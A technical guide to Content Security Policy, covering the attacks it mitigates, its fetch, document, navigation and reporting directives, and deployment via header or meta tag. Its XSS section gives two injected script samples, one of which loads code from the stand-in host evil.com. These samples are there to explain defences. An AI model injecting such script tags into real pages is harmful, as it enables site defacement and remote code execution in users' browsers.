# Introduction

Content Security Policy ([CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)) is a browser security mechanism that aims to mitigate Cross-Site Scripting ([XSS](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)) and some other attacks. It works by restricting the resources (such as scripts and images) that a page can load and restricting whether a page can be framed by other pages.

To enable CSP, a response needs to include an HTTP response header called `Content-Security-Policy` with a value containing the policy. The policy itself consists of one or more directives, separated by semicolons.

# Threats

## Mitigating cross-site scripting

By preventing the page from executing inline scripts, attacks like injecting

```html
<script>
  document.body.innerHTML = 'defaced'
</script>
```

will not work.

By preventing the page from loading scripts from arbitrary servers, attacks like injecting

```html
<script src="https://evil.com/hacked.js"></script>
```

will not work.

## Mitigating packet sniffing attacks

In addition to restricting the domains from which content can be loaded, the server can specify which protocols are allowed to be used; for example (and ideally, from a security standpoint), a server can specify that all content must be loaded using HTTPS. A complete data transmission security strategy includes not only enforcing HTTPS for data transfer, but also marking all cookies with the `secure` attribute and providing automatic redirects from HTTP pages to their HTTPS counterparts. Sites may also use the `Strict-Transport-Security` HTTP header to ensure that browsers connect to them only over an encrypted channel.

# CSP Directive Reference

This documentation is provided based on the [Content Security Policy Level 2](https://www.w3.org/TR/CSP2/) W3C Recommendation, and the [Content Security Policy Level 3](https://www.w3.org/TR/CSP3/) W3C Working Draft

## Fetch Directives

Fetch directives tell the browser the locations to trust and load resources from. Most fetch directives have a certain [fallback list specified in w3](https://www.w3.org/TR/CSP3/#directive-fallback-list). This list allows for granular control of the source of scripts, images, files, etc.

- `default-src` is a fallback directive for the other fetch directives. Directives that are specified have no inheritance, yet directives that are not specified will fall back to the value of `default-src`. <Tag>CSP Level 1</Tag>
- `script-src` specifies the locations from which a script can be executed from. It is a fallback directive for other script-like directives. <Tag>CSP Level 1</Tag>
  - `script-src-elem` controls the location from which execution of script requests and blocks can occur.
  - `script-src-attr` controls the execution of event handlers.
- `style-src` controls from where styles get applied to a document. This includes `<link>` elements, `@import` rules, and requests originating from a Link HTTP response header field. <Tag>CSP Level 1</Tag>
  - `style-src-elem` controls styles except for inline attributes.
  - `style-src-attr` controls styles attributes.
- `img-src` specifies the URLs that images can be loaded from. <Tag>CSP Level 1</Tag>
- `connect-src` provides control over fetch requests, XHR, eventsource, beacon and websockets connections. <Tag>CSP Level 1</Tag>
- `font-src` specifies which URLs to load fonts from. <Tag>CSP Level 1</Tag>
- `object-src` specifies the URLs from which plugins can be loaded from. <Tag>CSP Level 1</Tag>
- `media-src` specifies the URLs from which video, audio and text track resources can be loaded from. <Tag>CSP Level 1</Tag>
- `child-src` allows the developer to control nested browsing contexts and worker execution contexts. <Tag>CSP Level 2</Tag>
- `prefetch-sr`c specifies the URLs from which resources can be prefetched from. <Tag>CSP Level 3</Tag>
- `manifest-src` specifies the URLs that application manifests may be loaded from. <Tag>CSP Level 3</Tag>

## Document Directives

Document directives instruct the browser about the properties of the document to which the policies will apply to.

- `sandbox`(https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox) restricts a page's actions such as submitting forms. <Tag>CSP Level 1</Tag>
  - Only applies when used with the request header `Content-Security-Policy`.
  - Not specifying a value for the directive activates all of the sandbox restrictions. `Content-Security-Policy: sandbox;`
- `base-uri` specifies the possible URLs that the `<base>` element can use. <Tag>CSP Level 2</Tag>
- `plugin-types` limits the types of resources that can be loaded into the document (e.g. application/pdf). <Tag>CSP Level 2</Tag> 3 rules apply to the affected elements, `<embed>` and `<object>`:
  - The element needs to explicitly declare its type.
  - The element's type needs to match the declared type.
  - The element's resource needs to match the declared type.
  ```HTTP title="EXAMPLE PLUGIN-TYPES POLICY"
  plugin-types application/pdf;
  ```

## Navigation Directives

Navigation directives instruct the browser about the locations that the document can navigate to.

- `form-action` restricts the URLs which the forms can submit to. <Tag>CSP Level 2</Tag>
- `frame-ancestors` restricts the URLs that can embed the requested resource inside of `<frame>`, `<iframe>`, `<object>`, `<embed>`, or `<applet>` elements. <Tag>CSP Level 2</Tag>
  - If this directive is specified in a `<meta>` tag, the directive is ignored.
  - This directive doesn't fallback to the `default-src` directive.
  - `X-Frame-Options` is rendered obsolete by this directive and is ignored by the user agents.
- `navigate-to` restricts the URLs that the document may navigate to by any means. For example when a link is clicked, a form is submitted, or window.location is invoked. If `form-action` is present then this directive is ignored for form submissions. Removed from the CSP 3 Spec.

## Reporting Directives

Reporting directives deliver violations of prevented behaviors to specified locations. These directives serve no purpose on their own and are dependent on other directives.

- `report-to` defines a reporting group name defined by a `Report-To` HTTP response header. <Tag>CSP Level 3</Tag> See the [Reporting API](https://w3c.github.io/reporting/) for more info.
- `report-uri` directive is deprecated in CSP Level 3 in favor of the `report-to` directive, which is a URI that the reports are sent to.

# Implementing Content Security Policy

You can deploy a CSP as a HTTP response header or an HTML meta tag.

To configure your web server to return the HTTP Content-Security-Policy header, use:

```HTTP
Content-Security-Policy: [directive] [resource type]
```

To use the HTML `<meta>` element to configure a policy, it looks like this:

```html
<meta
  http-equiv="Content-Security-Policy"
  content="[directive] [resource type]"
/>
```
